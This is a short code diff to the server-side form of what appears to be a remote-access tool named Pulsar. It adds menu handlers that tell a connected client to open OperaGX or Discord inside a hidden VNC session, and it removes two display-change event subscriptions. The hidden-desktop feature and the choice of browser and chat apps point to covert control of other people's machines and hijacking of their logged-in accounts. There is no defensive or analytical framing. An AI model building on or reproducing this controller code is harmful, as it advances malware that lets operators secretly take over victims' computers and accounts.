@@ -117,7 +117,6 @@ namespace Pulsar.Server.Forms
         private void RegisterMessageHandler()
         {
             _connectClient.ClientState += ClientDisconnected;
-            _hVNCHandler.DisplaysChanged += DisplaysChanged;
             _hVNCHandler.ProgressChanged += UpdateImage;
             MessageHandler.Register(_hVNCHandler);
         }
@@ -128,7 +127,6 @@ namespace Pulsar.Server.Forms
         private void UnregisterMessageHandler()
         {
             MessageHandler.Unregister(_hVNCHandler);
-            _hVNCHandler.DisplaysChanged -= DisplaysChanged;
             _hVNCHandler.ProgressChanged -= UpdateImage;
             _connectClient.ClientState -= ClientDisconnected;
         }
@@ -421,6 +419,14 @@ namespace Pulsar.Server.Forms
             });
         }
 
+        private void startOperaGXToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            _connectClient.Send(new StartHVNCProcess
+            {
+                Application = "OperaGX"
+            });
+        }
+
         private void startFirefoxToolStripMenuItem_Click(object sender, EventArgs e)
         {
             _connectClient.Send(new StartHVNCProcess
@@ -461,6 +467,14 @@ namespace Pulsar.Server.Forms
         private void btnShow_Click(object sender, EventArgs e)
         {
             TogglePanelVisibility(true);
+        }
+
+        private void startDiscordToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            _connectClient.Send(new StartHVNCProcess
+            {
+                Application = "Discord"
+            });
         }
     }
 }
